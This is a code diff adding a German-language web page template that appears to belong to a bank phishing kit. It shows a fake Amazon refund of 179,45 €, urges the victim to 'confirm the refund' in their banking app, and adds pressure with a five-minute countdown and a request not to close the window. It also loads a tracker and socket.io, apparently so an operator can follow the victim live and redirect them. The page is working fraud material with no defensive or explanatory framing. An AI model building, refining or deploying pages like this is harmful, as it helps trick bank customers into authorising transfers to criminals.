@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifizierung</title>
+    <!-- Importing Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./css/bavoka.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+        <style>
+            /* Timer CSS adapted for new theme */
+            .timer-container {
+                margin: 24px 0;
+                text-align: center;
+                position: relative;
+            }
+
+            .circle-timer {
+                position: relative;
+                width: 120px;
+                height: 120px;
+                margin: 0 auto;
+            }
+
+            .circle-timer svg {
+                transform: rotate(-90deg);
+                width: 100%;
+                height: 100%;
+            }
+
+            .circle-timer circle {
+                fill: none;
+                stroke-width: 8;
+            }
+
+            .circle-timer .bg {
+                stroke: #e0e0e0;
+            }
+
+            .circle-timer .progress {
+                stroke: #5328b7;
+                stroke-dasharray: 440;
+                stroke-dashoffset: 0;
+                animation: circle-countdown 300s linear forwards;
+                /* 5 minutes matching JS */
+            }
+
+            @keyframes circle-countdown {
+                0% {
+                    stroke-dashoffset: 0;
+                }
+
+                100% {
+                    stroke-dashoffset: 440;
+                }
+            }
+
+            .timer {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                font-size: 24px;
+                font-weight: 600;
+                color: #111;
+                font-family: 'Inter', sans-serif;
+            }
+
+            /* State colors */
+            .timer.warning {
+                color: #c45500;
+            }
+
+            .timer.danger {
+                color: #d01a1a;
+                animation: pulse 1s infinite;
+            }
+
+            @keyframes pulse {
+                0% {
+                    transform: translate(-50%, -50%) scale(1);
+                }
+
+                50% {
+                    transform: translate(-50%, -50%) scale(1.05);
+                }
+
+                100% {
+                    transform: translate(-50%, -50%) scale(1);
+                }
+            }
+        </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="form1">
+            <div class="up">
+                <!-- Header -->
+                <div class="header-row">
+                    <button class="back-btn" aria-label="Go back">
+                        <svg aria-hidden="true" role="img" viewBox="0 0 20 20" height="24" width="24">
+                            <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
+                                <path
+                                    d="M12.5 9.167H4.047c.418-.365.828-.74 1.222-1.129a27.562 27.562 0 0 0 2.905-3.381l-1.348-.98a25.873 25.873 0 0 1-2.728 3.176c-.91.899-1.892 1.73-2.919 2.471a.833.833 0 0 0 0 1.352 24.844 24.844 0 0 1 2.92 2.471 25.87 25.87 0 0 1 2.727 3.177l1.348-.981a27.57 27.57 0 0 0-2.905-3.381c-.394-.39-.804-.764-1.222-1.129H12.5c2.757 0 5 2.243 5 5h1.667A6.674 6.674 0 0 0 12.5 9.167Z"
+                                    fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
+                            </g>
+                        </svg>
+                    </button>
+
+                    <div class="hodpa">
+                        <img src="./img/huodop.PNG" alt="">
+                    </div>
+
+                    <button class="close-btn" style="position: static;" aria-label="Close">
+                        <svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
+                                fill="#535353" />
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Hero Section -->
+                <div class="hero-icon-container">
+                    <img width="54" height="54" class="refudi-ico" src="./img/refudi-ico.svg" alt="">
+                    <h1 style="margin-top: 0; font-size: 24px;">Verifizierung erforderlich</h1>
+                </div>
+
+                <!-- Transaction Review Mockup -->
+                <div class="store-card" style="margin-bottom: 24px; background-color: #f7f7f7;">
+                    <div class="store-info">
+                        <div class="store-logo" style="background: #000; color: #fff;"><img src="./img/ico-amz.svg"
+                                alt=""></div>
+                        <div class="store-details">
+                            <h3>Amazon</h3>
+                            <p>179,45 € • Rückerstattung</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin-bottom: 24px;">
+                    <p style="font-size: 17px; color: #111; line-height: 1.5; font-weight: 600;">
+                        Bitte bestätigen Sie die Rückerstattung in Ihrer Banking-App.
+                    </p>
+                </div>
+
+                <!-- Timer -->
+                <div class="timer-container">
+                    <p style="font-size: 13px; color: #666; margin-bottom: 12px;">Die Anfrage läuft ab in:</p>
+                    <div class="circle-timer">
+                        <svg viewBox="0 0 160 160">
+                            <circle class="bg" cx="80" cy="80" r="70"></circle>
+                            <circle class="progress" cx="80" cy="80" r="70"></circle>
+                        </svg>
+                        <div class="timer" id="countdown">5:00</div>
+                    </div>
+                    <p style="font-size: 12px; color: #999; margin-top: 12px;">Bitte Fenster nicht schließen</p>
+                </div>
+            </div>
+
+            <div class="down">
+                <div class="info-box-purple" style="margin-top: 0;">
+                    <div class="info-content">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#5328b7" stroke="none">
+                            <circle cx="12" cy="12" r="10" />
+                            <path d="M12 16v-4" stroke="white" stroke-width="2" />
+                            <circle cx="12" cy="8" r="1" fill="white" />
+                        </svg>
+                        <span>
+                            Diese Seite wird automatisch nach erfolgreicher Bestätigung weitergeleitet.
+                        </span>
+                    </div>
+                </div>
+                <div class="bottom-spacer" style="padding-bottom: 20px;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Countdown timer functionality
+        function startCountdown() {
+            let duration = 5 * 60; // 5 minutes in seconds
+            const timerElement = document.getElementById('countdown');
+            const progressCircle = document.querySelector('.circle-timer .progress');
+
+            const timer = setInterval(function () {
+                const minutes = Math.floor(duration / 60);
+                let seconds = duration % 60;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                timerElement.textContent = minutes + ":" + seconds;
+
+                if (duration < 60) {
+                    progressCircle.style.stroke = '#d01a1a';
+                    timerElement.classList.add('danger');
+                    timerElement.classList.remove('warning');
+                } else if (duration < 120) {
+                    progressCircle.style.stroke = '#c45500';
+                    timerElement.classList.add('warning');
+                }
+
+                duration--;
+
+                if (duration < 0) {
+                    clearInterval(timer);
+                }
+            }, 1000);
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            startCountdown();
+        });
+    </script>
+</body>
+
+</html>
